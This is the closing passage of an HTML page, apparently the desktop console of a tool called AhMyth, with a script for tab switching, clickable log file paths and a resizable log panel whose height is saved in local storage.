        <div class="log-resizer" id="logResizer" title="Drag to resize console">
            <div class="log-resizer__handle"></div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const tabItems = document.querySelectorAll('.tab-nav__item');
            const tabContents = document.querySelectorAll('.tab-content');
            
            tabItems.forEach(item => {
                item.addEventListener('click', function() {
                    const targetTab = this.getAttribute('data-tab');
                    tabItems.forEach(t => t.classList.remove('active'));
                    this.classList.add('active');
                    tabContents.forEach(content => {
                        content.classList.toggle('active', content.getAttribute('data-tab') === targetTab);
                    });
                });
            });
            
            // Handle clicks on path links - use event delegation since logs are dynamically added
            const logContent = document.querySelector('.log-content');
            if (logContent) {
                logContent.addEventListener('click', function(event) {
                    const target = event.target;
                    if (target.classList.contains('log-path-link')) {
                        event.preventDefault();
                        event.stopPropagation();
                        const filePath = target.getAttribute('data-path');
                        if (filePath && typeof angular !== 'undefined') {
                            // Get the Angular scope from the controller
                            const scope = angular.element(document.querySelector('[ng-controller="AppCtrl"]')).scope();
                            if (scope && scope.openPath) {
                                scope.$apply(function() {
                                    scope.openPath(filePath);
                                });
                            }
                        }
                        return false;
                    }
                });
            }
            
            // Allow console log panel height to be resized and persisted
            const LOG_HEIGHT_KEY = 'ahmyth.logPanelHeight';
            const logElement = document.getElementById('log');
            const logResizer = document.getElementById('logResizer');
            if (logElement && logResizer) {
                const clampHeight = (value) => {
                    const min = 120;
                    const max = Math.max(window.innerHeight * 0.75, 260);
                    return Math.min(Math.max(value, min), max);
                };
                const applyHeight = (value) => {
                    const clamped = clampHeight(value);
                    document.documentElement.style.setProperty('--log-panel-height', clamped + 'px');
                    try {
                        localStorage.setItem(LOG_HEIGHT_KEY, clamped);
                    } catch (_) {}
                };
                let savedHeight = null;
                try {
                    const stored = localStorage.getItem(LOG_HEIGHT_KEY);
                    savedHeight = stored != null ? parseInt(stored, 10) : null;
                } catch (_) {}
                if (typeof savedHeight === 'number' && !Number.isNaN(savedHeight)) {
                    applyHeight(savedHeight);
                }
                let startY = 0;
                let startHeight = logElement.getBoundingClientRect().height;
                const stopMouseResize = () => {
                    document.body.classList.remove('log-resize-active');
                    window.removeEventListener('mousemove', handleMouseMove);
                    window.removeEventListener('mouseup', stopMouseResize);
                };
                const handleMouseMove = (event) => {
                    event.preventDefault();
                    const delta = event.clientY - startY;
                    applyHeight(startHeight + delta);
                };
                logResizer.addEventListener('mousedown', (event) => {
                    event.preventDefault();
                    startY = event.clientY;
                    startHeight = logElement.getBoundingClientRect().height;
                    document.body.classList.add('log-resize-active');
                    window.addEventListener('mousemove', handleMouseMove);
                    window.addEventListener('mouseup', stopMouseResize);
                });
                
                const handleTouchMove = (event) => {
                    if (!event.touches || !event.touches.length) return;
                    event.preventDefault();
                    const touch = event.touches[0];
                    applyHeight(startHeight + (touch.clientY - startY));
                };
                const stopTouchResize = () => {
                    document.body.classList.remove('log-resize-active');
                    window.removeEventListener('touchmove', handleTouchMove);
                    window.removeEventListener('touchend', stopTouchResize);
                };
                logResizer.addEventListener('touchstart', (event) => {
                    if (!event.touches || !event.touches.length) return;
                    startY = event.touches[0].clientY;
                    startHeight = logElement.getBoundingClientRect().height;
                    document.body.classList.add('log-resize-active');
                    window.addEventListener('touchmove', handleTouchMove, { passive: false });
                    window.addEventListener('touchend', stopTouchResize);
                }, { passive: false });
            }
        });
    </script>
</body>

</html>
